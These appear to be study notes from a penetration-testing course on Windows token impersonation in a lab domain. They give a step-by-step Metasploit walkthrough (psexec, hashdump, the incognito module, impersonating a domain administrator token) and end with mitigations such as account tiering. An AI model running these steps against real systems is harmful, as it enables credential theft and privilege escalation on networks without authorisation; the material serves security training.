3. Token Impersonation Attacks

What are **tokens**?
- Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. (like cookies for computers)

Two types:
- Delegate
	- Created for logging into a machine or using Remote Desktop
- Impersonate 
	- non-interactive" such as attaching a network drive or a domain logon script

***
We will use the incognito module on Metasploit. Step by step:
```
sudo msfconsole
```

```
msf> use exploit/windows/smb/psexec
```

Things we can run once we get the session

```
meterpreter> hashdump
meterpreter> getuid
meterpreter> sysinfo
```

Can now load tools. 
We will load incognito
```
meterpreter> load incognito
meterpreter> help
```

We will try to impersonate a user
```
meterpreter> list_tokens -u
```

Heath had MARVEL\Administrator available as a token (we had fcastle and could impersonate him):
```
meterpreter> impersonate_token marvel\\administrator
```
> we use two '\\' due to character escaping

Only who is logged in will show up. 
We can impersonate this user until the computer is rebooted

If we are cannot run system commands, can revert back to our identity:

```
meterpreter> rev2self
```

## Token Impersonation Mitigation

- Limit user/group token creation permission (not as effective)
- Much better> Account tiering
	- Domain admins should only log into DC's not other devices, as doing so we can still token impersonation attacks with admin details
- Local admin restriction
	- If users are not local admins on their computers that prevents us from getting shell on their computer and utilising this kind of attack
